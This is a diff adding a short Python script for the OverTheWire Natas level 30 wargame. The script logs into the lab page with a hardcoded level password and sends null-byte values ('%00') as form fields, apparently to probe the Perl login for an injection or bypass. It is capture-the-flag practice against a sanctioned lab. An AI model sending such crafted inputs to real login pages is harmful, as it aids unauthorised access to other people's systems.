@@ -1,0 +1,16 @@
+import requests
+
+base_url = "http://natas30.natas.labs.overthewire.org/index.pl"
+
+s = requests.session()
+
+username = "natas30"
+password = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
+
+s = requests.session()
+res1 = s.get(base_url, data={username: "%00", password: "%00"}, auth=(username,password), allow_redirects=False)
+
+
+print("="*80)
+print(res1.text)
+print("="*80)
